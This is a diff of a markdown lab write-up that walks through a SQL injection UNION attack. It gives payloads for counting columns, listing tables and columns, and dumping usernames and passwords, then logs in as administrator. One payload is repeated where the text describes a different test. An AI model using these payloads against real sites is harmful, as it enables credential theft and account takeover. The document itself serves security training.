@@ -8,46 +8,80 @@ To solve the lab, perform a SQL injection UNION attack that retrieves all userna
 
 ***
 
-hack
+Let's Start !!
+
+First We Visit The Website !!
 
 <figure><img src="../../../.gitbook/assets/image (552).png" alt=""><figcaption></figcaption></figure>
 
-hack
+We Try To Inject Single Quote `'` To Break The Backend Query !!
 
 <figure><img src="../../../.gitbook/assets/image (553).png" alt=""><figcaption></figcaption></figure>
 
-hack
+When We Inject `'--` They Fix The Query and Give No Error ,In SQL `--` Refer To Comment Out In Code !!
 
 <figure><img src="../../../.gitbook/assets/image (554).png" alt=""><figcaption></figcaption></figure>
 
-hack
+**Finding Number of Columns**
+
+**Method – ORDER BY**
+
+```
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+```
+
+If `ORDER BY 3` fails, query has 2 columns.
 
 <figure><img src="../../../.gitbook/assets/image (555).png" alt=""><figcaption></figcaption></figure>
 
-hack
+That `ORDER BY 3` fails, query has 2 columns.
 
 <figure><img src="../../../.gitbook/assets/image (556).png" alt=""><figcaption></figcaption></figure>
 
-hack
+Let's We Use In Our Two Column Table !!
+
+Then See If Our First and Second Both Column is String They Return No Error If They Return Error It's Mean One Column is Integer and One is String!!
+
+```
+'UNION SELECT 'a','b'--
+```
 
 <figure><img src="../../../.gitbook/assets/image (557).png" alt=""><figcaption></figcaption></figure>
 
-hack
+Then We Use This Query If It's Work It's Mean Second column is String !!
+
+```
+'UNION SELECT 'a','b'--
+```
 
 <figure><img src="../../../.gitbook/assets/image (558).png" alt=""><figcaption></figcaption></figure>
 
-hack
+Use the following payload to retrieve the list of tables in the database:
+
+```
+' UNION SELECT NULL,table_name FROM information_schema.tables--
+```
 
 <figure><img src="../../../.gitbook/assets/image (559).png" alt=""><figcaption></figcaption></figure>
 
-hack
+Use the following payload (replacing the table name) to retrieve the details of the columns in the table:
+
+```
+' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='users'--
+```
 
 <figure><img src="../../../.gitbook/assets/image (560).png" alt=""><figcaption></figcaption></figure>
 
-hacker
+Use the following payload to retrieve the contents of the `users` table:
+
+```
+' UNION SELECT NULL,username||'~'||password FROM users--
+```
 
 <figure><img src="../../../.gitbook/assets/image (561).png" alt=""><figcaption></figcaption></figure>
 
-hack
+Find the password for the `administrator` user, and use it to log in.
 
 <figure><img src="../../../.gitbook/assets/image (562).png" alt=""><figcaption></figcaption></figure>
